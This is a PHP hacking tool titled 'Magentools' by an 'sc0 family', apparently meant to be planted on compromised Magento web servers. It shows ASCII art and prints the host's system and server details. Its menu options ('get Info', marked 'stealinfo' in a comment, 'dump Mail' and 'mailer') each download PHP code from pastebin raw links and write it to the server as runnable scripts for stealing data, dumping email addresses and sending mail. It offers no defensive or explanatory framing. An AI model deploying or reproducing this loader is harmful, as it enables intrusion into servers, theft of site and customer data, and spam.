<?php
echo'
<pre style="text-align: center; font-size: 12px">
                                  /\ /\
                                     /  \---._
                                     / / `     `\
                                             \ \   ``<@)@)      
                                           /`         ~ ~._ 
                                             /                `() 
                                           /    \   (` ,_.:.  /
                                         / ~    `\   (vVvvvvV
                                     /       |`\_ `^^^/
                                    /________|___`---`
                                (_____S_C_0____) _
                                _/~          | `(_)
                              _/~             \  
                            _/~               |
                          _/~                 |
                        _/~                   |
                      _/~         ~.          |
                    _/~             \        /\
                 __/~               /`\     `||
               _/~      ~~-._     /~   \     ||
              /~             ~./~`      \    |)
             /                 ~.        \   )|
            /                    :       |   ||
STUPIDC0DE |                    :       |   ||
            |                   .`       |   ||
             __.-`                __.`--.     |   |`---. 
          .-~  ___.         __.--~`--.))))     |   `---.)))
       `---~~     `-...--.________)))))       \_____)))))
</pre>';

/** info kernel */
echo"
<title> Magentools (c) sc0 family 2k17 </title>
<br>
<center>".php_uname()."<br>
".$software = getenv("SERVER_SOFTWARE");

echo'<br>
<table border=1>
<tr><form method="post" action="">&nbsp;<td>
<select class="inputzbut" align="left"  name="pilihan" id="pilih">
<option value="#">..:: magentool ::..</option>
<option value="curry">get Info</option>
<option value="dump">dump Mail</option>
<option value="mailer">mailer</option>

</select>
<input  type="submit" name="submites" class="inputzbut" value=">">
</td></form></tr></table>';

error_reporting(0);
set_time_limit(0);
$submit = $_POST ['submites'];
if(isset($submit)) {
	$pilih = $_POST['pilihan'];
		if ( $pilih == 'ini') {
			
		}
		

	///stealinfo
		elseif ( $pilih == 'curry') {
	$files = file_get_contents("http://pastebin.com/raw/wwEnDy4A");
		file_put_contents("curry.php",$files);
		echo "<script>alert('created'); hideAll();</script>";
		echo "<a href="."curry.php"." target=_blank><b>curry.php</b></a></center>";
		die();
		}
		
		
		///dumper
		elseif ( $pilih == 'dump') {
	$files = file_get_contents("http://pastebin.com/raw/qQaeZF01");
		file_put_contents("dump.php",$files);
		echo "<script>alert('created'); hideAll();</script>";
		echo "<a href="."dump.php"." target=_blank><b>dump.php</b></a></center>";
		die();
		}
	
		///mailer
		elseif ( $pilih == 'mailer') {
	$files = file_get_contents("http://pastebin.com/raw/Drdu0tGG");
		file_put_contents("mailer.php",$files);
		echo "<script>alert('created'); hideAll();</script>";
		echo "<a href="."mailer.php"." target=_blank><b>mailer.php</b></a></center>";
		die();
		}
		
		
	}
		
		

?>
